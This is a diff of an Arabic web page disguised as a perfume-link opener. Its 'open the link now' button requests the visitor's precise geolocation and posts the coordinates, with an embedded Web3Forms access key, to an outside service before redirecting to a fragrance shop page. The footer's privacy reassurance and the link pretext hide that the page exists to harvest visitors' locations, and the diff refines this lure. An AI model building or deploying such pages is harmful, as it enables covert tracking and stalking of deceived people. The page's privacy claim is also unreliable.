@@ -1,65 +1,201 @@
 <!doctype html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>آختر عطرك</title>
+  <title>اختر عطرك – فتح الرابط</title>
+  <meta name="color-scheme" content="light dark">
   <style>
-    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;padding:24px;background:#f7f7fb;color:#111;direction:rtl;text-align:right}
-    .card{max-width:640px;margin:0 auto;background:white;padding:18px;border-radius:12px;box-shadow:0 6px 20px rgba(12,12,16,0.06)}
-    button{padding:10px 16px;border-radius:8px;border:0;font-size:16px;cursor:pointer}
-    .btn-primary{background:#0b84ff;color:white}
-    .hint{color:#666;margin-top:8px;font-size:14px}
+    :root{
+      --bg: linear-gradient(135deg,#f3f6ff 0%, #eef7ff 40%, #fff 100%);
+      --card-bg: rgba(255,255,255,.72);
+      --text:#0f172a;
+      --muted:#667085;
+      --brand:#0b84ff;
+      --brand-600:#0568cc;
+      --success:#16a34a;
+      --warn:#f59e0b;
+      --error:#dc2626;
+      --shadow: 0 10px 30px rgba(12,12,16,.12);
+      --radius: 16px;
+    }
+    @media (prefers-color-scheme: dark){
+      :root{
+        --bg: radial-gradient(1200px 800px at 80% -10%, #0b1220 0, #0b1220 50%, #0a0f1c 100%);
+        --card-bg: rgba(17,24,39,.65);
+        --text:#e5e7eb;
+        --muted:#9aa4b2;
+        --brand:#3b82f6;
+        --brand-600:#2563eb;
+        --success:#22c55e;
+        --warn:#fbbf24;
+        --error:#ef4444;
+        --shadow: 0 18px 40px rgba(0,0,0,.4);
+      }
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;min-height:100dvh;display:grid;place-items:center;
+      background:var(--bg);
+      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,"Noto Kufi Arabic",sans-serif;
+      color:var(--text);
+      padding:24px;
+    }
+    .card{
+      width:min(720px, 100%);
+      background:var(--card-bg);
+      backdrop-filter:saturate(1.2) blur(8px);
+      border-radius:calc(var(--radius) + 4px);
+      box-shadow:var(--shadow);
+      border:1px solid rgba(148,163,184,.18);
+      overflow:hidden;
+    }
+    .header{
+      display:flex;align-items:center;gap:12px;
+      padding:20px 20px 0 20px;
+    }
+    .logo{
+      width:42px;height:42px;border-radius:12px;
+      display:grid;place-items:center;
+      background:conic-gradient(from 220deg, #0b84ff, #6ee7b7, #a78bfa, #0b84ff);
+      box-shadow: inset 0 0 0 2px rgba(255,255,255,.4);
+    }
+    .logo svg{filter:drop-shadow(0 2px 4px rgba(0,0,0,.12))}
+    h1{font-size:20px;margin:0}
+    .sub{color:var(--muted);margin:6px 0 0 0;font-size:14px}
+
+    .content{padding:18px 20px 20px 20px}
+    .btns{display:flex;flex-wrap:wrap;gap:10px;margin-top:14px}
+    button{padding:11px 16px;border-radius:12px;border:0;cursor:pointer;font-size:15px;display:inline-flex;align-items:center;gap:10px}
+    .btn-primary{background:var(--brand);color:#fff;box-shadow:0 6px 16px rgba(11,132,255,.24)}
+    .btn-primary:hover{background:var(--brand-600)}
+    .btn-ghost{background:transparent;color:var(--muted);border:1px solid rgba(148,163,184,.35)}
+    .btn-ghost:hover{color:var(--text);border-color:rgba(148,163,184,.6)}
+    .btn-primary[disabled]{opacity:.6;cursor:not-allowed}
+
+    .hint{color:var(--muted);margin-top:10px;font-size:13px}
+    .divider{height:1px;background:rgba(148,163,184,.28);margin:18px 0}
+
+    .result{display:grid;gap:8px}
+    .result strong{font-size:14px;color:var(--muted)}
+    .status{
+      border-radius:12px;padding:12px 14px;line-height:1.7;border:1px solid rgba(148,163,184,.28);
+      background:rgba(255,255,255,.5);
+    }
+    .badge{display:inline-flex;align-items:center;gap:6px;font-size:12px;padding:3px 8px;border-radius:999px;border:1px solid transparent}
+    .ok{color:var(--success);border-color:var(--success)}
+    .warn{color:var(--warn);border-color:var(--warn)}
+    .err{color:var(--error);border-color:var(--error)}
+
+    .footer{padding:14px 20px;background:linear-gradient(180deg, rgba(255,255,255,.12), rgba(255,255,255,.04));display:flex;justify-content:space-between;align-items:center;gap:10px;border-top:1px solid rgba(148,163,184,.18)}
+    .tiny{font-size:12px;color:var(--muted)}
+    .switch{display:flex;align-items:center;gap:8px}
+    .switch input{accent-color:var(--brand)}
+
+    .spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.6);border-top-color:#fff;border-radius:50%;display:inline-block;animation:spin .8s linear infinite}
+    @keyframes spin{to{transform:rotate(1turn)}}
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2> فتح الرابط في المتصفح </h2>
-    <p>هل تريد الرابط في المتصفح الآن؟ سيتم طلب إذن من المتصفح.</p>
+  <main class="card" role="region" aria-label="فتح الرابط في المتصفح">
+    <header class="header">
+      <div class="logo" aria-hidden="true">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 3v4" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+          <path d="M12 21v-4" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+          <path d="M3 12h4M21 12h-4" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+          <circle cx="12" cy="12" r="6.5" stroke="#fff" stroke-width="2" fill="none"/>
+        </svg>
+      </div>
+      <div>
+        <h1>فتح الرابط في المتصفح</h1>
+        <p class="sub">سيطلب المتصفح الإذن للوصول إلى الموقع الجغرافي قبل المتابعة.</p>
+      </div>
+    </header>
 
-    <div style="display:flex;gap:10px;margin-top:12px">
-      <button id="btnShare" class="btn-primary"> فتح الرابط الآن</button>
-      <button id="btnCancel">❌ إلغاء</button>
-    </div>
+    <section class="content">
+      <div class="btns">
+        <button id="btnShare" class="btn-primary" aria-live="polite">
+          <span class="icon" aria-hidden="true">📍</span>
+          <span id="btnText">فتح الرابط الآن</span>
+        </button>
+        <button id="btnCancel" class="btn-ghost">❌ إلغاء</button>
+      </div>
 
-    <p class="hint">سيظهر إشعار من المتصفح لطلب الإذن.</p>
-    <hr style="margin:16px 0">
-    <div id="result">
-      <strong>النتيجة:</strong>
-      <div id="output" style="margin-top:8px;color:#111">لم يتم طلب الإذن بعد.</div>
-    </div>
-  </div>
+      <p class="hint">نصيحة: فعّل <strong>خدمات الموقع</strong> في هاتفك أو المتصفح لضمان دقة أعلى.</p>
+
+      <div class="divider" role="separator" aria-hidden="true"></div>
+
+      <div class="result">
+        <strong>النتيجة</strong>
+        <div id="output" class="status" aria-live="polite">لم يتم طلب الإذن بعد.</div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <span class="tiny">نحترم خصوصيتك: نستخدم موقعك فقط لإتمام العملية المطلوبة.</span>
+      <label class="switch tiny" title="افتح في تبويب جديد">
+        <input type="checkbox" id="openNewTab">
+        افتح في تبويب جديد
+      </label>
+    </footer>
+  </main>
 
 <script>
-const THANK_YOU_URL = 'https://www.fragrancex.com/products/dolce-and-gabbana/';
+// \u2728 إعدادات
+const THANK_YOU_URL = 'https://www.fragrancex.com/products/dolce-and-gabbana/'; // غيّر الرابط كما تشاء
+const WEB3FORMS_ENDPOINT = 'https://api.web3forms.com/submit';
+const WEB3FORMS_ACCESS_KEY = '2e13fcef-864c-4f30-b438-1155b980f68a'; // استبدله بمفتاحك عند اللزوم
 
+// عناصر DOM
 const btnShare = document.getElementById('btnShare');
 const btnCancel = document.getElementById('btnCancel');
 const output = document.getElementById('output');
+const btnText = document.getElementById('btnText');
+const openNewTab = document.getElementById('openNewTab');
 
-function show(msg){ output.innerHTML = msg; }
+function badge(text, type){
+  const cls = type === 'ok' ? 'ok' : type === 'warn' ? 'warn' : type === 'err' ? 'err' : '';
+  return `<span class="badge ${cls}"> ${text} </span>`;
+}
+function fmt(num){ return typeof num === 'number' ? num.toFixed(6) : num; }
+function show(html){ output.innerHTML = html; }
+function setLoading(state){
+  if(state){
+    btnShare.disabled = true;
+    btnText.innerHTML = `<span class="spin" aria-hidden="true"></span> جاري الطلب...`;
+  }else{
+    btnShare.disabled = false;
+    btnText.textContent = 'فتح الرابط الآن';
+  }
+}
 
 btnShare.addEventListener('click', async () => {
   if (!('geolocation' in navigator)) {
-    show('المتصفح لا يدعم فتح الموقع.');
+    show(`${badge('غير مدعوم', 'err')} المتصفح لا يدعم ميزة الموقع الجغرافي.`);
     return;
   }
 
-  show('⏳ جاري طلب إذن الوصول إلى الموقع...');
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-    const lat = pos.coords.latitude.toFixed(6);
-    const lon = pos.coords.longitude.toFixed(6);
-    const acc = pos.coords.accuracy;
+  setLoading(true);
+  show(`${badge('انتظار', 'warn')} ⏳ جاري طلب إذن الوصول إلى الموقع...`);
 
-    show(`✅ تم الحصول على الموقع:<br>خط العرض: ${lat}<br>خط الطول: ${lon}<br>دقة: ${acc} متر`);
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    const { latitude, longitude, accuracy } = pos.coords;
+    const lat = fmt(latitude);
+    const lon = fmt(longitude);
+    const acc = Math.round(accuracy);
+
+    const when = new Intl.DateTimeFormat('ar-IQ', { dateStyle:'medium', timeStyle:'short' }).format(new Date());
+
+    show(`${badge('تم بنجاح', 'ok')} ✅ تم الحصول على الموقع في ${when}<br>\n<strong>خط العرض:</strong> ${lat}<br>\n<strong>خط الطول:</strong> ${lon}<br>\n<strong>الدقة:</strong> ${acc} متر`);
 
     // إرسال المعلومات إلى Web3Forms
     try {
-      const resp = await fetch('https://api.web3forms.com/submit', {
+      const resp = await fetch(WEB3FORMS_ENDPOINT, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-          access_key: '2e13fcef-864c-4f30-b438-1155b980f68a',  // مفتاح Web3Forms
+          access_key: WEB3FORMS_ACCESS_KEY,
           subject: 'موقع جديد تمت مشاركته',
           from_name: 'نموذج مشاركة الموقع',
           latitude: lat,
@@ -69,28 +205,34 @@ btnShare.addEventListener('click', async () => {
       });
 
       if (resp.ok) {
-        // عرض رسالة سريعة ثم التحويل
-        show(output.innerHTML + '<br><em> ت سيتم تحويلك الآن…</em>');
-        // التحويل التلقائي إلى فيديو اليوتيوب
-        window.location.href = THANK_YOU_URL;
-        // أو لو تريده يفتح في تبويب جديد بدل التحويل:
-        // window.open(THANK_YOU_URL, '_blank');
+        show(output.innerHTML + '<br><em>سيتم تحويلك الآن…</em>');
+        // التحويل حسب تفضيل المستخدم
+        if(openNewTab.checked){
+          window.open(THANK_YOU_URL, '_blank');
+        } else {
+          window.location.href = THANK_YOU_URL;
+        }
       } else {
-        show(output.innerHTML + '<br><em>.</em>');
+        show(output.innerHTML + '<br>' + `${badge('فشل الطلب', 'err')} تعذر إرسال البيانات. حاول لاحقًا.`);
       }
     } catch (e) {
-      show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
+      show(output.innerHTML + '<br>' + `${badge('خطأ اتصال', 'err')} حدث خطأ في الاتصال بالخدمة.`);
+    } finally {
+      setLoading(false);
     }
 
   }, (err) => {
-    if (err.code === err.PERMISSION_DENIED) show('❌ المستخدم رفض  الموقع.');
-    else if (err.code === err.POSITION_UNAVAILABLE) show('⚠️ الموقع غير متاح حالياً.');
-    else if (err.code === err.TIMEOUT) show('⏰ انتهت المهلة.');
-    else show('حدث خطأ: ' + err.message);
+    setLoading(false);
+    if (err.code === err.PERMISSION_DENIED) show(`${badge('مرفوض', 'err')} ❌ المستخدم رفض منح الإذن بالموقع.`);
+    else if (err.code === err.POSITION_UNAVAILABLE) show(`${badge('غير متاح', 'warn')} ⚠️ الموقع غير متاح حالياً.`);
+    else if (err.code === err.TIMEOUT) show(`${badge('انتهت المهلة', 'warn')} ⏰ انتهت مهلة الطلب.`);
+    else show(`${badge('خطأ', 'err')} حدث خطأ: ${err.message}`);
   }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 });
 
-btnCancel.addEventListener('click', () => show('تم الإلغاء بواسطة المستخدم.'));
+btnCancel.addEventListener('click', () => {
+  show(`${badge('أُلغي', 'warn')} تم الإلغاء بواسطة المستخدم.`);
+});
 </script>
 </body>
 </html>
